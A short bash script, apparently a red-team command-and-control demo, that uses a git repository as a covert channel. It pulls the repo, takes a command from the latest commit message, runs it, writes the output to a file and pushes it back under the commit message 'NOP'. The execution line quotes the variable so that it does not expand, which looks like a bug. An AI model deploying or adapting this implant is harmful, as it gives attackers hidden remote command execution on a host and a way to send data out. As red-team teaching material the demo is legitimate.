#!/usr/bin/bash

# VAR
BASEDIR=/home/sheliak/Toolz/sToolz

# repo update
cd $BASEDIR
git pull

# get command
CMD=$(git log -1 | awk 'NR==5 {print $1}')

# check NOP
if [ "$CMD" = 'NOP' ]
then
    # do nothing
    echo "NOP"
else
    # do something
    ### IFS=', ' read -r -a array <<< $CMD
    ### eval "${array[0]} ${array[1]} ${array[2]}" >> $BASEDIR/RedTeam/C2demo/output.txt
    res=$('$CMD')
    echo $res >> $BASEDIR/RedTeam/C2demo/output.txt
    # commit and push
    git add .
    git commit -m "NOP"
    git push
fi
